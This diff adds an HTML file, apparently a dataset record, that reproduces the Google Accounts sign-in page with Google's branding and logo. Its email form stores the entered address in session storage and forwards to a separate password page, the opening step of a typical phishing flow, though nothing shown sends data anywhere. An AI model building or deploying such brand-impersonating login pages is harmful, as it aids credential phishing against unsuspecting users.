@@ -1,0 +1,250 @@
+source: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Roboto', sans-serif;
+            color: #202124;
+        }
+
+        .login-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .login-card {
+            width: 448px;
+            min-height: 500px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .google-logo {
+            height: 24px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            margin: 8px 0;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-field:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+
+        .input-field:hover {
+            border-color: #d2d2d2;
+        }
+
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.25px;
+            margin-bottom: 48px;
+        }
+
+        .forgot-email:hover {
+            background-color: #f6fafe;
+        }
+
+        .helper-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+
+        .helper-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+        }
+
+        .helper-text a:hover {
+            background-color: #f6fafe;
+        }
+
+        .button-container {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.25px;
+            padding: 8px 8px;
+            border-radius: 4px;
+        }
+
+        .create-account:hover {
+            background-color: #f6fafe;
+        }
+
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 0 24px;
+            height: 36px;
+            border-radius: 4px;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #1557b0;
+            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
+        }
+
+        footer {
+            padding: 24px;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #757575;
+        }
+
+        .language-select {
+            padding: 6px 8px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #757575;
+            background-color: transparent;
+            font-size: 12px;
+        }
+
+        .footer-links span {
+            margin: 0 8px;
+            cursor: pointer;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                align-items: flex-start;
+                padding: 0;
+            }
+
+            .login-card {
+                width: 100%;
+                min-height: 100vh;
+                border: none;
+                padding: 24px;
+            }
+
+            footer {
+                flex-direction: column;
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
+                 alt="Google" class="google-logo">
+            <h1>Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+            <form id="emailForm" onsubmit="handleEmailSubmit(event)">
+                <div class="form-group">
+                    <input type="email" class="input-field" placeholder="Email or phone" id="emailInput" required>
+                </div>
+                <a href="#" class="forgot-email">Forgot email?</a>
+                <p class="helper-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+                <div class="button-container">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <footer>
+        <select class="language-select">
+            <option value="en">English (United States)</option>
+        </select>
+        <div class="footer-links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
+    </footer>
+    <script>
+        function handleEmailSubmit(event) {
+            event.preventDefault();
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput.value.trim();
+
+            if (email) {
+                sessionStorage.setItem('userEmail', email);
+                window.location.href = 'password.html';
+            }
+        }
+    </script>
+</body>
+</html>
+Page title: Sign in - Google Accounts
